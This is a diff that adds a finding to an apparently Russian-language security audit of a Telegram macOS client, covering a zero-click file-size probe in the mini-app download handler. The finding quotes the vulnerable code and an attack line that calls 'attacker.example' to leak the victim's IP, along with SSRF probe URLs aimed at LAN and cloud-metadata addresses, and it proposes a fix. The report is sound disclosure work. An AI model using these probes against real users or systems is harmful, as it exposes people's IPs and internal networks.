@@ -174,6 +174,7 @@ The subsequent `savePanel(file:named:for:)` uses an `NSSavePanel`, which require
 | 3 | File download `fileName` path traversal | N/A | MITIGATED | `WebpageModalController.swift:2685` |
 | 4 | JS-Bridge Hijacking (`sameOrigin == false`) | CRITICAL | CONFIRMED | `WebpageModalController.swift:1271,1621,1695,2892` |
 | 5 | Biometric Auth bypass (`accessGranted` missing) | HIGH | CONFIRMED | `WebpageModalController.swift:2015,2055` |
+| 6 | `web_app_request_file_download` zero-click size probe (IP leak + SSRF) | MEDIUM-HIGH | CONFIRMED | `WebpageModalController.swift:2169` → `FileDownload.swift:45` |
 
 ---
 
@@ -475,6 +476,98 @@ case "web_app_biometry_request_auth":
     }
     // ... остальной код
 ```
+
+---
+
+## Finding 6 — MEDIUM-HIGH
+
+### Zero-click исходящий запрос через `web_app_request_file_download` (утечка IP + SSRF, до согласия)
+
+**Файлы:**
+- `packages/WebAppUI/Sources/WebAppUI/WebpageModalController.swift:2164–2184`
+- `packages/FoundationUtils/Sources/FoundationUtils/FileDownload.swift:45–75`
+**CVSS estimate:** 6.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
+
+#### Описание
+
+Это **тот же класс, что и Finding 1**, но через другой обработчик и другой сетевой стек — показывает, что проблема носит характер паттерна, а не единичного упущения.
+
+Обработчик `web_app_request_file_download` при получении события **сразу** запрашивает размер файла по бот-контролируемому URL, ещё **до** показа диалога подтверждения загрузки:
+
+```swift
+// WebpageModalController.swift:2164
+case "web_app_request_file_download":
+    if let json = json, let url = (json["url"] as? String), let fileName = json["file_name"] as? String {
+        if let bot = bot {
+            if #available(macOS 10.15, *) {
+                let _ = (FileDownload.getFileSize(url: url)          // ← СЕТЕВОЙ ЗАПРОС СРАЗУ
+                         |> deliverOnMainQueue).start(next: { [weak self] fileSize in
+                    ...
+                    downloadFile(url: url, fileName: fileName, ...)  // диалог подтверждения ПОЗЖЕ
+                })
+            }
+        }
+    }
+```
+
+`FileDownload.getFileSize` не валидирует схему URL и шлёт HEAD-запрос напрямую через системный `URLSession.shared`:
+
+```swift
+// FileDownload.swift:45
+public static func getFileSize(url: String) -> Signal<Int64?, NoError> {
+    if #available(macOS 14.0, *) {
+        guard let url = URL(string: url) else { return .single(nil) }   // нет проверки схемы
+        var request = URLRequest(url: url)
+        request.httpMethod = "HEAD"
+        return Signal { subscriber in
+            let task = URLSession.shared.dataTask(with: request) { ... } // прямой запрос, НЕ через прокси Telegram
+            task.resume()
+            ...
+        }
+    } else {
+        return .single(nil)
+    }
+}
+```
+
+Ключевые свойства дефекта:
+1. **Нет гейта `clickCount`/`attachMenuBot`/whitelist** — любой мини-апп, открытый пользователем, срабатывает без взаимодействия.
+2. **Нет валидации схемы** — `http://`, `https://`, `file://`, URL на внутренние IP (LAN) принимаются.
+3. **`URLSession.shared` напрямую** — запрос идёт по системной сети, **минуя in-app SOCKS/MTProxy Telegram**. Пользователь, специально настроивший прокси в Telegram для сокрытия IP, всё равно раскрывает реальный адрес.
+4. **Запрос до согласия** — диалог `verifyAlert` в `downloadFile` показывается только ПОСЛЕ завершения HEAD-запроса.
+
+#### Сценарий атаки (простыми словами, по шагам)
+
+1. Жертва открывает мини-апп бота-злоумышленника (один тап — обычное действие, напр. «играть», «открыть магазин»).
+2. JS мини-аппа мгновенно вызывает:
+   ```javascript
+   window.Telegram.WebApp.downloadFile({
+       url: "https://attacker.example/probe.bin?id=VICTIM_123",
+       file_name: "update.bin"
+   });
+   ```
+3. Клиент macOS **без какого-либо диалога** шлёт HEAD-запрос на `attacker.example` прямо с машины жертвы.
+4. Злоумышленник получает **реальный IP** жертвы (даже при включённом в Telegram прокси) + отпечаток времени.
+5. Диалог «Скачать update.bin?» появляется только потом — жертва может его отклонить, но запрос уже ушёл.
+
+#### Расширение SSRF
+
+Поскольку схема/хост не проверяются, `url = "http://192.168.1.1/"` или `http://169.254.169.254/...` (облачные метаданные) заставляет клиента зондировать внутренние сервисы. Через наличие/отсутствие заголовка `Content-Length` в ответе (возвращается в сигнал как размер файла, который затем показывается боту в тексте диалога) злоумышленник получает частичный оракул о доступности и размере внутренних ресурсов. На unsandboxed direct-download сборке сетевых ограничений песочницы нет.
+
+#### Рекомендуемое исправление
+
+```swift
+public static func getFileSize(url: String) -> Signal<Int64?, NoError> {
+    guard let parsed = URL(string: url),
+          let scheme = parsed.scheme?.lowercased(), scheme == "https",
+          let host = parsed.host, !isPrivateOrLocalHost(host) else {
+        return .single(nil)
+    }
+    // ... + сам HEAD-запрос выполнять только ПОСЛЕ подтверждения пользователя
+}
+```
+
+Либо показывать диалог подтверждения (`downloadFile`) **до** вызова `getFileSize`, передавая размер уже после согласия.
 
 ---
 
